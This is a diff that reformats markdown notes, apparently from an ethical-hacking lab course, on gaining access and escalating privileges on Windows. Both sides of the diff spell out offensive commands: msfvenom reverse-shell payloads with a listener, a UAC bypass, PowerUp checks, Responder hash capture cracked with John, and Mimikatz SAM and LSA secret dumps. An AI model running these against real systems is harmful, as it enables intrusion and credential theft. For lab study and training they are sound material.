@@ -9,39 +9,40 @@ responder -I eth0 ---------------  sudo ./Responder.py -I ens3
 sudo john /home/ubuntu/Responder/logs/[Log File Name.txt]
 ```
 
-- Audit system passwords using L0phtCrack
-Password Auditing Wizard
+- Audit system passwords using L0phtCrack  
+    Password Auditing Wizard
 
-- Find vulnerabilities on exploit sites
-<https://www.exploit-db.com/>
-VulDB <https://vuldb.com>
-MITRE CVE <https://cve.mitre.org>
-Vulners <https://vulners.com>
-CIRCL CVE Search <https://cve.circl.lu>
+- Find vulnerabilities on exploit sites  
+    <https://www.exploit-db.com/>  
+    VulDB <https://vuldb.com>  
+    MITRE CVE <https://cve.mitre.org>  
+    Vulners <https://vulners.com>  
+    CIRCL CVE Search <https://cve.circl.lu>  
 
-- Exploit client-side vulnerabilities and establish a VNC session
-`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -fexe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`
+- Exploit client-side vulnerabilities and establish a VNC session  
+    `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -fexe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`
 
 ```bash
 msfconsole
 use exploit/multi/handler
 ...
 ```
+  
+`upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1`  
+`powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”`  
+`run vnc`  
 
-`upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1`
-`powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”`
-`run vnc`
-
-- Gain access to a remote system using Armitage
-Pentesting --> Exploitation Tools --> MetasploitFramework --> armitage
-Nmap Scan --> Intense Scan
-Create payload
-Work with meterpreter shell
+- Gain access to a remote system using Armitage  
+    1. Pentesting --> Exploitation Tools --> MetasploitFramework --> armitage  
+    2. Nmap Scan --> Intense Scan  
+    3. Create payload  
+    4. Work with meterpreter shell
 
 - Gain access to a remote system using Ninja Jonin
-Ninja is installed in victim machine and Jonin is installed on the attacker machine
-modifiy constants.json set ip and port
-when receiving access denied on listener "list" -> "connect 1" -> change -> cmd
+    Ninja is installed in victim machine  
+    Jonin is installed on the attacker machine  
+    Modifiy constants.json set ip and port  
+    when receiving access denied on listener "list" -> "connect 1" -> change -> cmd
 
 - Perform buffer overflow attack to gain access to a remote system  
     1. Start vulnserver as administrator  
@@ -75,21 +76,20 @@ when receiving access denied on listener "list" -> "connect 1" -> change -> cmd
 
 ## Perform privilege escalation to gain higher privileges
 
-- Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
-`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe >/home/attacker/Desktop/Exploit.exe`
-start msfconsole (exploit -j -z)
-beRoot.exe
-GhostPack
-    Seatbelt.exe -group=system
-    Seatbelt.exe -group=user
-    Seatbelt.exe -group=misc
-                 -group=all
-                 -group=slack
-                 -group=chromium
-                 -group=remote
-                                -outputfile=""
-`use exploit/windows/local/bypassuac_fodhelper` --> `getsystem -t 1`
-run post/windows/gather/smart_hashdump
+- Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities  
+    `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe >/home/attacker/Desktop/Exploit.exe`  
+    start msfconsole (exploit -j -z)  
+    beRoot.exe    
+    Seatbelt.exe -group=system  
+    Seatbelt.exe -group=user  
+    Seatbelt.exe -group=misc  
+                 -group=all  
+                 -group=slack  
+                 -group=chromium  
+                 -group=remote  
+                                -outputfile=""  
+    `use exploit/windows/local/bypassuac_fodhelper` --> `getsystem -t 1`  
+    `run post/windows/gather/smart_hashdump` --> dump hash  
 
 - Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
 
@@ -145,11 +145,11 @@ ps -ef
 use post/windows/manage/sticky_keys
 ```
 
-- Escalate privileges to gather hashdump using Mimikatz
-load kiwi
-lsa_dump_sam
-lsa_dump_secrets
-password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
+- Escalate privileges to gather hashdump using Mimikatz  
+    `load kiwi`  
+    `lsa_dump_sam`  
+    `lsa_dump_secrets`  
+    `password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`  
 
 ## Maintain remote access and hide malicious activities
 
